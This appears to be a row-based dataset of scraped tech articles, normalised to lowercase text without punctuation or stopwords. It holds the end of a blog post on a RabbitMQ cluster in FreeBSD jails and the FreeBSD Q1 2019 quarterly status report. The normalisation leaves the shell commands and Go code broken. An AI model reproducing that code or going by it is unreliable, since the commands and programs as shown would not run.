rabbitmqfreebsdjails rabbitmqfreebsdjails rabbitmq administrative user create administrative user called admin rabbitmq instance host jexec rabbit rabbitmqctl adduser admin adminpassword done adding user admin adding user admin host jexec rabbit rabbitmqctl setusertags admin administrator done setting tag user admin administrator setting tag user admin administrator host jexec rabbit rabbitmqctl setpermissions p admin done setting permission user admin vhost setting permission user admin vhost able login http http also rabbitmq management page login useful rabbitmq dashboard welcome rabbitmq cluster setup create rabbitmq cluster rabbitmqctl clusterstatus cluster status node rabbit node disc rabbit runningnodes rabbit clustername partition alarm rabbit hostname rabbitmqctl joincluster rabbit error command requires rabbit app stopped target node stop rabbitmqctl stopapp argument given joincluster rabbit usage rabbitmqctl node longnames quiet joincluster disc ram first need stop rabbitmq application join cluster rabbitmqctl stopapp stopping rabbit application node rabbit rabbitmqctl joincluster rabbit clustering node rabbit rabbit rabbitmqctl startapp starting node rabbit completed plugins rabbitmqctl clusterstatus cluster status node rabbit node disc rabbit rabbit runningnodes rabbit rabbit clustername partition alarm rabbit rabbit rabbitmqctl clusterstatus cluster status node rabbit node disc rabbit rabbit runningnodes rabbit rabbit clustername partition alarm rabbit rabbit formed two node rabbitmq cluster rename cluster rabbitmqctl setclustername rabbit cluster setting cluster name rabbit cluster rabbitmqctl clusterstatus cluster status node rabbit node disc rabbit rabbit runningnodes rabbit rabbit clustername partition alarm rabbit rabbit cluster look web interface rabbitmq highly available policy highly available mirrored queue rabbitmq need create policy declare policy named ha match queue whose name begin ha prefix configured mirroring two node cluster command need execute create policy rabbitmqctl setpolicy ha ha hamode hasyncmode automatic setting policy hamirror pattern ha hamode hasyncmode automatic priority vhost alternatively use web interface create matter method chosen end needed ha policy shown feed queue two node rabbitmq cluster ha queue name start ha prefix test rabbitmq setup create feed queue sendgo script probably guessed written go need add go language host system go language installation host pkg install go updating freebsd repository catalogue freebsd repository date repository date following package affected checked new package installed go number package installed process require mib space mib downloaded proceed action yn host go version go version sendgo script use send message hadefault queue based rabbitmq hello world tutorial host cat sendgo package main import log amqp func failonerror err error msg string err nil logfatalf msg err func main conn err amqpdial amqp admin adminpassword failonerror err er failed connect rabbitmq defer connclose ch err connchannel failonerror err er failed open channel defer chclose q err chqueuedeclare hadefault name false durable false delete unused false exclusive false nowait nil argument failonerror err er failed declare queue body hello world err chpublish exchange qname routing key false mandatory false immediate amqppublishing contenttype textplain body byte body logprintf sent message body failonerror err er failed publish message run host go run sendgo find package amqp usrlocalgosrcamqp goroot homevermadengopkgsrcamqp gopath lack amqp package go language need download http githubcomstreadwayamqp page get downloading everything zip package host mkdir p gopkgsrc host cd host pwd homevermadengopkgsrc host fetch http githubcomstreadwayamqparchivemasterzip host unzip masterzip archive homevermadengopkgsrcmasterzip creating amqpmaster extracting amqpmastergitignore extracting amqpmastertravisyml extracting amqpmasterurigo extracting amqpmasteruritestgo extracting amqpmasterwritego host rm masterzip host mv amqpmaster amqp host cd amqp host pwd homevermadengopkgsrcamqp host exa example confirmsgo deliverytestgo license spec confirmstestgo docgo precommit tlstestgo allocatorgo connectiongo exampleclienttestgo readgo typesgo allocatortestgo connectiontestgo examplestestgo readtestgo urigo authgo consumersgo fuzzgo readmemd uritestgo certssh consumerstestgo gensh reconnecttestgo writego channelgo contributingmd gomod returngo clienttestgo deliverygo integrationtestgo sharedtestgo also need make sure path gopath properly configured need put interactive shell config go shell setup mkdir p gopkg export gopathgopkg export path path gopkg get back feeding queue host go run sendgo sent message hello world sent message hello world sent message hello world sent message hello world sent message hello world sent message hello world sent message hello world sent message hello world sent message hello world sent message hello world hadefault queue created feeded message need receive message queue receivego script come help also based rabbitmq hello world tutorial host cat receivego package main import log amqp func failonerror err error msg string err nil logfatalf msg err func main conn err amqpdial amqp admin adminpassword failonerror err er failed connect rabbitmq defer connclose ch err connchannel failonerror err er failed open channel defer chclose q err chqueuedeclare hadefault name false durable false delete unused false exclusive false nowait nil argument failonerror err er failed declare queue msg err chconsume qname queue consumer true autoack false exclusive false nolocal false nowait nil args failonerror err er failed register consumer forever make chan bool go func range msg logprintf received message dbody logprintf waiting message logprintf exit press ctrlc forever output running stop running end ctrlc sequence host go run receivego waiting message exit press ctrlc received message hello world received message hello world received message hello world received message hello world received message hello world received message hello world received message hello world received message hello world received message hello world received message hello world c checked source code carefully probably noticed sent message node received message node simple benchmark make simple benchmark receivego script left running modified sendgo script loop message host go run receivego waiting message exit press ctrlc message host go run sendgo sent message hello world sent message hello world sent message hello world sent message hello world sent message hello world sent message hello world result simple benchmark message per second handled rabbitmq clustered instance within two freebsd jail high availability test high availability rabbitmq cluster currently hadefault qeue node kill jail see rabbitmq web interface reacts host jls jid ip address hostname path host killall j host umount hadefault queue matter second switched node ha work desired let start jail get redundancy back host service jail onestart starting jail host hadefault queue got redundancy back mark remained node last least little anniversary end article counting valuable news series blog update month rabbitmq rabbitmq cluster freebsd container article featured month rabbitmq july episode thanks mentioning update make rabbitmq use le cpu reported felix ehlers twitter rabbitmq cpu usage reduced setting rabbitmqserveradditionalerlargs sbwt none variable eof like like loading related
242,Lobsters,freebsd,FreeBSD,FreeBSD Quarterly Status Report - First Quarter 2019,https://lists.freebsd.org/pipermail/freebsd-stable/2019-June/091243.html,freebsd quarterly status report first quarter,freebsd quarterly status report first quarter trasz freebsdorg http cifreebsdorg http artifactcifreebsdorg http wikifreebsdorgjenkins http listsfreebsdorgmailmanlistinfofreebsdtesting http githubcomfreebsdfreebsdci http http wikifreebsdorghostedci http hackfoldrorgfreebsdcireport jenkinsadmin freebsdorg lwhsu freebsdorg http hackfoldrorgfreebsdcireport core freebsdorg http deb freebsdfoundationorg http wwwfreebsdfoundationorgfreebsdfoundationpartnershipprogram http http http downloadfreebsdorgftpsnapshotsisoimages freebsdorg http wwwfreebsdorgports http http portsmonfreebsdorgindexhtml http wwwfreebsdorgportmgrindexhtml portmgrsecretary freebsdorg portmgr freebsdorg ganbold freebsdorg mst semihalfcom mw semihalfcom kib freebsdorg http wikifreebsdorgcapsicum ngie freebsdorg markj freebsdorg emaste freebsdorg oshogbo freebsdorg borakoozarslan gmailcom http trueosgithubiopkgbasedocs kmoore freebsdorg http githubcomamznamzndriversblobmasterkernelfbsdenareadme mk semihalfcom mw semihalfcom http http http mst semihalfcom mw semihalfcom mindal semihalfcom asomers freebsdorg http ota jemailnejp http wikifreebsdorglld http emaste freebsdorg http wwwmellanoxcompageproductsdyn mtagfreebsddriver freebsddrivers mellanoxcom konstantinb mellanoxcom kib freebsdorg br freebsdorg mhorne freebsdorg markj freebsdorg http freebsdorggnome http githubcomfreebsdfreebsdportsgnome kwm freebsdorg ericbsd freebsdorg http freebsdkdeorg adridg freebsdorg tcberner freebsdorg kde freebsdorg http wikifreebsdorgintelmacmini fbsdwiki gmxnet http githubcomgooglesyzkaller markj freebsdorg andrew freebsdorg tuexen freebsdorg emaste freebsdorg http gitlabcomalfixsysctlmibinfo alfonsosiciliano emailcom http wwwgitlabcomalfixsysctlview alfonsosiciliano emailcom emaste freebsdorg http information freebsdstable mailing list,freebsd quarterly status report first quarter edward tomasz napierała trasz freebsdorg tue jun utc freebsd project quarterly status report quarter spring lead summer reflect back freebsd project accomplished first quarter event included fosdem asiabsdcon freebsd journal free everyone aslr available current kpti controlled perprocess run begun team applying syzkaller guided fuzzing kernel plus much catch many new ongoing effort throughout project find pitch freebsd team report continuous integration freebsd core team freebsd foundation freebsd release engineering team port collection project pmic driver update broadcom soc support c runtime change capsicum cft package base ena freebsd driver update freebsd boot security improvement fuse kernel zlib update llvm lld freebsd system linker driver update pci express reset securityrelated change architecture freebsdriscv update port freebsd gnome status report freebsd kde status report thirdparty project freebsd wiki apple intel mac mini update fuzzing freebsd syzkaller sysctlmibinfo api sysctlview university waterloo cooperative education student freebsd team report entry various official semiofficial team found administration page continuous integration link freebsd jenkins instance url http cifreebsdorg freebsd ci artifact archive url http artifactcifreebsdorg freebsd jenkins wiki url http wikifreebsdorgjenkins freebsdtesting mailing list url http listsfreebsdorgmailmanlistinfofreebsdtesting freebsdci repository url http githubcomfreebsdfreebsdci ticket related freebsdtesting url http hosted ci wiki url http wikifreebsdorghostedci freebsd ci weekly report url http hackfoldrorgfreebsdcireport contact jenkins admin jenkinsadmin freebsdorg contact liwen hsu lwhsu freebsdorg freebsd ci team maintains continuous integration system related task freebsd project ci system regularly check change committed project subversion repository successfully built performs various test analysis result result build job archived artifact server testing debugging need ci team member examine failing build unstable test work expert area fix code adjust test infrastructure starting quarter started publish ci weekly report freebsdtesting mailing list archive available http hackfoldrorgfreebsdcireport also worked extending test executing environment improve code coverage temporarily disabling flakey test case opening ticket work domain expert detail effort available weekly ci report published draft fcp ci policy ready accept comment please see freebsdtesting related ticket information work progress fixing failing test case build adding drm port building test current implementing automatic test bare metal hardware implementing embedded testbed planning running ztest network stack test help software get ci freebsd hosted ci solution freebsd core team contact freebsd core team core freebsdorg freebsd core team governing body freebsd core initiated release engineering charter modernization working group purpose working group present core modernized version release engineering charter first version new release engineering team operation plan group hope complete goal dissolve core team invite member freebsd community complete freebsd community survey http purpose survey collect quantitative data public order help guide project priority effort remain open day close midnight may utc monday pdt editor note survey finished core voted approve source commit bit johannes lundberg johalun mitchell horne mhorne associate membership philip jock core also voted revoke michael dexter documentation bit long lapse closing idle source commit bit core taken commit bit developer thank contributing project source committer alfred perlstein alfred eric badger badger daniel eischen deischen ermal luçi eri tony finch fanf justin gibbs gibbs imre vadász ivadasz julio merino jmmv john w de boskey jwd kai wang kaiw luigi rizzo luigi neel natu neel craig rodrigues rodrigc stanislav sedov stas thomas quinot thomas andrew thompson thompsa pyun yonghyeon yongari zbigniew bodek zbb freebsd foundation contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage software development project conference developer summit provide travel grant freebsd contributor foundation purchase support hardware improve maintain freebsd infrastructure provides resource improve security quality assurance release engineering effort publishes marketing material promote educate advocate freebsd project facilitates collaboration commercial vendor freebsd developer finally represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter kicked year allday board meeting berkeley freebsd began put together highlevel plan included prioritizing technology feature support longterm planning next year philosophical discussion purpose goal partnership commercial user support began year meeting commercial user help navigate working project understanding using freebsd also process setting meeting throughout rest c nonprofit nt directly support commercial user however meeting allow u focus facilitating collaboration community fundraising effort work funded donation kicked year many individual corporate donation including donation commitment netapp netflix intel tarsnap beckhoff automation ecard vmware stormshield working hard get commercial user give back help u continue work supporting freebsd please consider making donation help u continue increase support freebsd wwwfreebsdfoundationorgdonate also partnership program provide benefit larger commercial donor find information http wwwfreebsdfoundationorgfreebsdfoundationpartnershipprogram share company o improvement foundation improves freebsd operating system employing technical staff maintain improve critical kernel subsystem add feature functionality fix problem also includes funding separate project grant like port porting blacklistd access control daemon integration vimage support make sure freebsd remains viable solution research education computing product quarter commits nine foundationsponsored staff member grant recipient kicked continued following project last quarter fuse file system kernel support update bug fix linuxulator testing diagnostics improvement sdio wifi infrastructure improvement scalability performance improvement openzfs online raidz expansion software developer staff allowed u jump work directly project improve freebsd like pmap improvement bugfixes address userland threading library issue improve support keep platform viable improve freebsd riscv application capsicum sandboxing framework build system improvement bug fix respond report security issue implement vulnerability mitigation tool chain update improvement adding kernel code coverage support syzkaller coverageguided system call fuzzer improved syzkaller support freebsd improve usability freebsdupdate improve network stack stability address race condition ensure freebsd provides userland interface required contemporary application implement support machinedependent optimized subroutine update correct documentation manpages dtrace bug fix update freebsd valgrind port try upstream change continuous integration quality assurance foundation provides fulltime staff member working improving automated testing continuous integration overall quality assurance effort first quarter foundation staff continued improving project ci infrastructure working contributor fix failing build test case working team project testing need quarter started publishing ci weekly report freebsdtesting mailing list see freebsd ci section report information release engineering foundation provides fulltime staff member oversee release engineering effort provided timely reliable release last five year first quarter freebsd release engineering team continued providing weekly development snapshot addition release engineering team published schedule upcoming cycle fourth release branch build stability reliability upcoming schedule found http freebsd currently targeted final release early july please see freebsd release engineering team section quarterly status report additional detail surrounding mentioned work supporting freebsd infrastructure foundation provides hardware support improve freebsd infrastructure last quarter continued supporting freebsd hardware located around world freebsd advocacy education large part effort dedicated advocating project includes promoting work done others freebsd producing advocacy literature teach people freebsd help make path starting using freebsd contributing project easier attending getting freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project check advocacy education work last quarter attended fosdem staffed freebsd stand sponsored colocated freebsd developer summit gave year freebsd presentation bsd dev room sponsored presented thimphu bhutan represented freebsd apricot yuseonggu daejeon south korea sponsored usenix fast conference boston industry partner ran first ever freebsd track scale included allday getting started freebsd workshop thrilled turnout almost participant received lot positive feedback thanks roller angel taught class help deb goodkin gordon tetlow also promoted freebsd freebsd table expo hall sponsored presented exhibited fossasia singapore sponsored asiabsdcon committed sponsoring rootconf bsdcan eurobsdcon created registration system aberdeen hackathon upcoming vienna freebsd security hackathon provided freebsd advocacy material provided travel grant freebsd contributor attend many event continued producing freebsd advocacy material help people promote freebsd around world read conference adventure conference recap trip report monthly newsletter help educate world freebsd publishing professionally produced freebsd journal excited announce release januaryfebruary issue freebsd journal free publication find access latest issue wwwfreebsdfoundationorgjournal find event attended upcoming event wwwfreebsdfoundationorgnewsandevents also engaged new website developer help u improve website make easier community member find information easily make site efficient legalfreebsd ip foundation owns freebsd trademark responsibility protect also provide legal support core team investigate question arise go wwwfreebsdfoundationorg find support freebsd help freebsd release engineering team link freebsd schedule url http freebsd development snapshot url http downloadfreebsdorgftpsnapshotsisoimages contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing first quarter freebsd release engineering team published initial schedule upcoming freebsd fourth release branch building stability reliability freebsd currently targed release early july additionally throughout quarter several development snapshot build released head branch much work sponsored freebsd foundation port collection link freebsd port url http wwwfreebsdorgports contributing port url http freebsd port monitoring url http portsmonfreebsdorgindexhtml port management team url http wwwfreebsdorgportmgrindexhtml contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg always summary happened port tree last quarter number port dropped slightly end quarter open port pr last quarter saw commits committers pr closed commits made last quarter welcomed kai knoblich kai said goodbye matthew rezny rezny infrastructure side two new us introduced azurepy sdl usesgecko removed default version lazarus llvm bumped respectively big port framework endoflife removed php postgresql webkitgtk xpi firefox updated firefoxesr chromium updated last quarter antoine ran expruns package update moving gnu ld llvm ld switching clang project project span multiple category kernel userspace port collection external project pmic driver update contact ganbold tsagaankhuu ganbold freebsdorg highly integrated pmic target libattery liion lipolymer application provides flexible power management solution processor allwinner soc soc used pinebook following update performed driver enabled necessary bit activating interrupt allows reading event interrupt status register event reported devd via system pmu subsystem battery ac usb pluggedunplugged battery absent charged charging added sensor support sensor value battery charging charge state voltage charging current discharging current battery capacity obtained via sysctl added sysctl setting battery charging current charging current set using step step correspond granularity broadcom soc support contact michal stanek mst semihalfcom contact marcin wojtas mw semihalfcom semihalf team continued working freebsd support broadcom soc series quadcore communication processor targeted networking application router gateway control plane processing na completed since last update iproc pcie root complex internal external bus otp one time programmable memory driver progress bnxt ethernet support crypto engine acceleration ipsec offloading todo upstreaming work work expected submittedmerged head second half project sponsored juniper network inc c runtime change contact konstantin belousov kib freebsdorg several change made c runtime generally improves environment provided application fix library initial exec tl mode library prominent nvidiaprovided thus binaryonly use called initial exec mode tl variable access fastest mode tl access drawback reliably work main binary linked library ie dlopening library load runtime guaranteed work mode work placing tl variable object one area allocated executable initialization somewhat explains name mode obvious consequence library loaded later space tl area application put tl variable freebsd dynamic linker aware misbehaviour app builder provides amount slack tl area give space library appeared initial content tl segment library distributed among thread tl area still breaking library use initial exec mode tl another issue somewhat mitigates misuse mode dfstatictls flag dynamic section flag allows linker check space earlier avoid loading dependency total required space linker flag implemented bfd ld linker llvm lld linker freebsd dynamic linker fixed properly distribute tl initialization data thread initial segment required reasonably extensive perarchitecture change libc libthr simultaneously lld improved mark library using initial exec tl mode appropriate flag measure make freebsd resilent improperly linked library interesting fix user nvidia libgl library fixed relinking use rtld malloc libthr freebsd implementation mutexes libthr allocates memory keep mutex data needed mutex initialization contrast malloc implementation used freebsd jemalloc requires working pthread mutexes operation creates chickenandegg problem executable startup requires jemalloc provide fragile hack make possible initialize mutexes constant source mismatch import new version jemalloc freebsd rtld implementation already contained lightweight malloc implementation suitable limited use precruntime environment seemed ideal fit allocator pthread private mutexes memory using allocator method address cyclic dependency jemalloc libthr could finally implemented entry point rtld mallocc renamed avoid clash libc exported symbol file linked statically libthr providing allocator private mutexes pthread key storage later already switched direct use mmap similar reason le memory wasted key storage requires le page destructors order bug alexander kabaev kan noted c destructors static object linked shared library executed c destructors static object main binary verified clang g amusingly attribute destructor bug introduced init function init array main binary startup called rtld instead csu c startup code linked binary typically cause due somewhat complicated way destructors called finifini array rtldregistered atexit handler solution register rtld atexit handler main binary init function called using new internal abi libcatexit function amusing bug noticed many year project sponsored freebsd foundation capsicum link capsicum wiki page url http wikifreebsdorgcapsicum contact enji cooper ngie freebsdorg contact mark johnston markj freebsdorg contact ed maste emaste freebsdorg contact mariusz zaborski oshogbo freebsdorg contact bora özarslan borakoozarslan gmailcom three theme capsicum work importing google capsicum test suite freebsd porting sandboxing openrsync freebsd applying capsicum additional base system utility googletestbased capsicum test case integrated freebsd discussion david drysdale main maintainer developer capsicum port linux decided freebsd upstream capsicum test case next major step sandboxing openrsync course work extended fileargs service two new functionality modified fileargs service allow limiting operation performed delegate lstat casper service furthermore openrsync highly depends ft api spend time optimizing ft making sandbox friendly introducing ftsopenat function removing need change working directory traverse path change ft api test phase moreover improved bootstrapping nonfreebsd machine thanks work build tool needed bootstrap freebsd use casper service base system string sandboxed result also sandboxed rtsol rtsold savecore host biweekly capsicum call note meeting published freebsd capsium meeting repository github would like join call hesitate send u email cft package base link package base cft faq url http trueosgithubiopkgbasedocs contact kris moore kmoore freebsdorg trueos project working package base implementation pleased issue first cft freebsd community trueos packaging work development close month differs original freebsd package base effort tree implementation allows version freebsd packaged requires patch poudriere well minor port enhancement first currently review information current status please refer faq page additionally workinggroup bsdcan encourage porter attend join discussion project sponsored ixsystems inc ena freebsd driver update link ena readme url http githubcomamznamzndriversblobmasterkernelfbsdenareadme contact michal krawczyk mk semihalfcom contact marcin wojtas mw semihalfcom ena elastic network adapter smart nic available virtualized environment amazon web service aws ena driver support multiple transmit receive queue handle gb network traffic depending instance type used development freebsd similar linux dpdk since last update internal review improvement patch done followed validation various aws instance upstream patch recently aws released instance instance freebsd kernel fixed ena used instance issue change required resource activation ena driver addition missing bus release method nexus module change ena driver run instance without known issue project sponsored amazoncom inc freebsd boot security improvement link veriexec manifest verification kernel url http tpm entropy source url http uefi support libsecureboot url http contact michal stanek mst semihalfcom contact marcin wojtas mw semihalfcom contact kornel duleba mindal semihalfcom freebsd gained tpm trusted platform module support end kernel configuration option tpmharvest also added use tpm rng system entropy source used way tpm harvested every ten second entropy mixed o entropy pool kernel option currently disabled default generic kernel configuration uefi secure boot support developed semihalf merged sjg veriexec support resulting unified library named libsecureboot library used verification kernel module loader library us bearssl cryptographic backend library support loading trusted blacklisted certificate uefi dbdbx database use trust anchor verification library also used veriexec verify parse authentication database called manifest kernel previously manifest verified parsed userspace application sent kernel via devveriexec significant limitation security weakness backport stable branch special thanks sjg juniper fruitful cooperation around veriexec libsecureboot development project sponsored stormshield fuse contact alan somers asomers freebsdorg fuse file system userspace allows userspace program implement file system widely used support outoftree file system like ntfs well exotic pseudo file system like sshfs freebsd fuse driver added gsoc project since time largely neglected fuse software buggy outofdate implementation year behind freebsd foundation agreed fund project improve state freebsd fuse driver far written test suite fusefs module fixed previously reported bug discovered fixed new bug fixed fusefs coverity cid made minor performance enhancement done general cleanup next quarter plan continue fixing bug also raise driver api level high quarter run currently highest defined level project sponsored freebsd foundation kernel zlib update link review url http contact yoshihiro ota ota jemailnejp freebsd system still us ancient yearold version zlib version freebsd kernel zlib implementation special enhancement used netgraph separate version code derived unzip used inflate gzip file kernel could replaced modern zlib detailed information written sysmoduleszlibreadme review order use latest zlib version work done revisit existing zlib us system code work newer version zlib unzip code need conversion work use newer zlib caller made simplier using newer apis available updated zlib zombie program broken would like delete clean zombie program duplicated zlib code also make future zlib version update easier change touch sensitive area system kernel loading architecture specific like also touch legacy code like kgzipkgzldr tester active user legacy zlib code welcomed armv elftrampoline arm boot gzipped kernel code modified use newer api simplicity please verify gzipped kernel still boot new code current code fall back legacy zlib case failure please also elaborate link kernel still trying figure netgraph compressiondecompression please help testing andor teach test netgraph compiles freebsd zlib version inside gzipped aout anyone use gzipped aout executables still someone easy safe program run aout format zfs boot boot gzipped file system today ctf checking test llvm lld freebsd system linker link lld freebsd wiki url http wikifreebsdorglld lld exprun url http contact ed maste emaste freebsdorg freebsdhead default freebsd system linker ie usrbinld llvm lld lld used bootstrap linker ie build kernel base system enabled system linker multiple issue building freebsd port enabled primary issue affecting lld many port build positiondependent code ie nonpic use shared library either come omitting fpic compiler flag using handwritten positiondependent assembly compared cpu architecture positionindependent code rather inefficient may responsible port author making explicit decision avoid pic default lld allow positiondependent code shared object particular permit relocation readonly segment typically containing text section last quarter many commits made port tree fix build system linker lld either building pic code adding znotext linker flag permit relocation readonly segment switching port link gnu ld incompatible lld way point dozen open bug report issue linking port lld system linker expect freebsd use lld system linker well task fix freepascallazarus port lld triage address remaining port failure holistic review lld workarounds port tree identify change longer needed addressed lld sent upstream project sponsored freebsd foundation driver update link mellanox ofed freebsd documentation url http wwwmellanoxcompageproductsdyn mtagfreebsddriver contact slava shwartsman han petter selasky konstantin belousov freebsddrivers mellanoxcom driver provides support pci express adapter based lx ex dx driver provides support ethernet driver provides support infiniband rdma converged ethernet roce following update done driver added support device support interface speed added tl hardware offload support device tl tx crypto offload new feature network device enables kernel tl socket skip encryption authentication operation transmit side data path delegating nic turn network adapter encrypts packet belong offloaded tl socket fly mellanox network adapter modify packet header expects receive fully framed tcp packet tl record payload nic replaces plaintext ciphertext fill authentication tag adapter hold state beyond context needed encrypt next expected packet ie expected tcp sequence number crypto state add support dynamic receive queue interrupt moderation dynamic interrupt moderation dim refers action made hardware andor software run time control interrupt rate system moderation action interfere system operation require human interaction networking dynamic interrupt moderation used controlling rate interrupt generated hardware multiple traffic scenario enhanced support selfhealing mechanism rare occasion mellanox network adapter fail due firmware bug example driver sense catastrophic error result failure detection device driver trigger firmware reset device recover without need reboot entire host added support indriver firmware updating using project sponsored mellanox technology pci express reset contact konstantin belousov konstantinb mellanoxcom sometimes need reset device attached system present preferrably device reset accomplished without causing whole machine reboot easy usb device physical access available replug device inchassis device builtin addon card possible reset device physical action unless device hotplugged nonetheless typical modern pcie device builtin pciemulation device reset initiated using software action device real pluggedin pcie device reset initiated disabling retraining pcielink upstream port control pci device support pci power management specification proven way accomplish reset put device state return previous power state freebsd missing way conveniently request user driverinitiated reset device possible manually fiddle register using pciconf impractical user requires lot boilerplate code driver new busresetchild method added newbus bus interface implementation added pcie bridge pci device libdevctl library call devctl command provide convenient userspace accessors application administrator reset device driver must stop operation device one way achieve detach driver reset reattach device afterwards mostly fine network interface device require coordination handle properly example nvme disk device detached mean mounted volume abruptly disapper vfs view due busresetchild method allows caller select either detachreattach suspendresume driver action around reset mellanox us infrastructure perform reset mlx card firmware reset without server reboot believed devctl reset widely useful project sponsored mellanox technology securityrelated change contact konstantin belousov kib freebsdorg aslr aslr address space layout randomization patch review committed svn debate continues current forwardlooking value aslr provides implementation freebsd source tree make easily available wish use also move conversation past relative merit comprehensive security control kpti perprocess control kpti kernel page table isolation implementation structured selection page isolation mode local current address space word global control variable pti almost unused code path instead userkernel value directly loaded register compared see user page table trimmed missed bit code provided isilon bug fixed last place direct use pti removed system start ptienabled mode proccontrol used root selectively disable kpti mode child process motivation trust program run get speed nonpti syscalls back still run normal user session pti mode eg firefox would properly isolated featurecontrol bit every freebsd executable contains bit mask intended enablingdisabling securityrelated feature make sense binary mask part executable segment loaded image activation thus part reasonable way authenticate binary content instance aslr compatibility defacto property image process executing image first zero bit mask control aslr optout os eg solaris used osspecific dynamic flag runtime property leaf le bit consume featurecontrol mask featurecontrol mask read kernel rtld image activation expected feature added freebsd mask used enablingdisabling feature expected tool manipulate mask provided shortly see review project sponsored freebsd foundation architecture updating platformspecific feature bringing support new hardware platform freebsdriscv update contact ruslan bukin br freebsdorg contact mitchell horne mhorne freebsdorg contact mark johnston markj freebsdorg work continued riscv port past quarter support transparent superpage promotion added riscv port meaning application automatically use large page mapping possible percpu pmap activation tracking added reducing overhead various pmap operation noticeably improves responsiveness freebsd running multicpu virtual machine riscv implementation minidumps completed support debugging riscv kernel dump land develgdb next gdb release possible compile intree llvm riscv target setting withllvmtargetriscvyes etcsrcconf use llvm compile riscv port currently experimental investigation ongoing work ongoing bring freebsd sifive hifive unleashed development board one obtained freebsd developer also expect work support new version sbi specification project sponsored freebsd foundation darpa afrl port change affecting port collection whether sweeping change touch tree individual port freebsd gnome status report link gnome freebsd url http freebsdorggnome gnome development repo url http githubcomfreebsdfreebsdportsgnome contact koop mast kwm freebsdorg contact eric turgeon ericbsd freebsdorg port activity quarter port updated later port updated old insecure finally removed work progress branch available gnome development repo see link eric turgeon working mate branch almost complete charlie li irc vishwin working long overdue update cinnamon desktop update almost complete real blocker screensaver ca nt unlocked activates work cinnamon branch koop mast work gnome desktop usable apart gdm currently nonfunctional due lack free time work going slowly work available branch people willing contribute find u freebsdgnome freenode freebsd kde status report link kde freebsd url http freebsdkdeorg contact adriaan de groot adridg freebsdorg contact tobias c berner tcberner freebsdorg two biggest accomplishements quarter consumer removed port tree updated ancient kai kept kde framework plasma application port date upstreams release thanks upstreams freebsdci us le le patch kde maintained port including cmake kept date release plan next quarter particular order cleanup pyqt port pyqtmk improve qtmk component update sddm implement user management functionality system setting write nonlogind backend people willing contribute find u kdefreebsd freenode kde freebsdorg mailing list accept pullrequests contribution githubcomfreebsdfreebsdportskde thirdparty project many project build upon freebsd incorporate component freebsd project project may interest broader freebsd community sometimes include brief update submitted project quarterly report freebsd project make representation accuracy veracity claim submission freebsd wiki apple intel mac mini update link freebsd wiki url http wikifreebsdorgintelmacmini contact trevor roydhouse fbsdwiki gmxnet freebsd wiki page apple intel mac mini comprehensively updated last quarter drag detailed instruction installing freebsd operating system model itemised model specific information detailing freebsd support anyone interested help needed provide specific information macmini model test patch asmc driver temperature sensor feedback setting fan speed would like help access mac mini please contact future task create test patch asmc cover intel mac mini provide information mac mini instruction dual boot macosfreebsd installation fuzzing freebsd syzkaller link syzkaller url http githubcomgooglesyzkaller contact mark johnston markj freebsdorg contact andrew turner andrew freebsdorg contact michael tuexen tuexen freebsdorg contact ed maste emaste freebsdorg syzkaller coverageguided system call fuzzer originally developed linux programmatically creates program consisting sequence random system call executes vm virtual machine using feedback kernel code coverage facility called kcov syskaller mutates generated test program attempt expand executed coverage code path within kernel sometimes exercising seldom infrequently used code path crash kernel syzkaller manages crash running kernel vm attempt generate minimal test case reproduces crash simplifying debugging syzkaller effective finding kernel bug uncovered hundred issue linux past couple year syzkaller author dmitry vyukov added support operating system including freebsd recently number freebsd developer using syzkaller find fix bug freebsd kernel interested one search commit log syzkaller find example syzkaller run freebsd linux host fuzz freebsd running qemu instance also fuzz freebsd instance running gce google compute engine additionally google maintains dedicated cluster gce host continuously fuzz latest build several different o kernel freebsd target recently added subscribe syzkallerfreebsdbugs google group receive notification newly discovered bug work ongoing improve syzkaller coverage freebsd system call particular syzkaller need taught target kernel entry point argument type order useful many standard posix system call already covered freebsdspecific system call similarly many ioctl definition missing inprogress work aim add support bhyve vm backend syzkaller making easier fuzz freebsd vms hosted freebsd currently done using qemu qemu freebsd lack support hardware acceleration see pr implementation finally number bug identified syzkaller yet fixed interested helping please mail contact listed project sponsored freebsd foundation sysctlmibinfo api link gitlabcomalfixsysctlmibinfo url http gitlabcomalfixsysctlmibinfo contact alfonso sabato siciliano alfonsosiciliano emailcom port devellibsysctlmibinfo sysctl system call get set value property system property others info description type label etc necessary build utility like sbinsysctl example sysctl kernostype kernostype operating system type sysctl kernostype kernostype string primarily sysctlmibinfo wrap undocumented kernel interface provides easy c api sysctlmifname sysctlmifdescription sysctlmifinfo sysctlmiflabel sysctlmifnextnode sysctlmifnextleaf retrieve info property moreover sysctlmibinfo provides high level api defines struct sysctlmifobject function sysctlmiffilterlist sysctlmifgrouplist sysctlmiftree build list tree object use library quickly build custom sysctl utility example core deskutilssysctlview graphical explorer sysctl mib tree call sysctlmiftree visit resulting tree show sysctlmifobject node note actually property oid sysctl mib implemented struct sysctloid defined syssysctlh sysctlview link gitlabcomalfixsysctlview url http wwwgitlabcomalfixsysctlview contact alfonso sabato siciliano alfonsosiciliano emailcom port deskutilssysctlview freebsd kernel maintains management information base object property tuning system using sysctl syscall sbinsysctl utility sysctlview utility graphical sysctl mib explorer depends gtkmm build gui sysctlmibinfo retrieve info kernel version provides two treeview main show name description type format value flag show name column flag defined syssysctlh row clickable display others info eg label currently sysctlview show numeric string value support opaque value added future university waterloo cooperative education student contact ed maste emaste freebsdorg januaryapril term freebsd foundation brought two cooperative education coop student university waterloo gerald aryeetey year computer engineering student gerald started looking freebsd tool chain issue static library archiver ar read write archive format gerald submitted libarchive change support archive followed change freebsd ar add support gerald later looked number freebsdupdate issue freebsd bugzilla database submitted many fix around dozen committed freebsd review gerald also worked freebsd foundation hardware continuous integration effort prototype installation building freebsd commitbycommit basis testing beaglebone black lts prototype converted permanent public installation near future additional test device added final project gerald intends write device driver microchip pcie nic bora özarslan year student computing financial management bora initial focus also tool 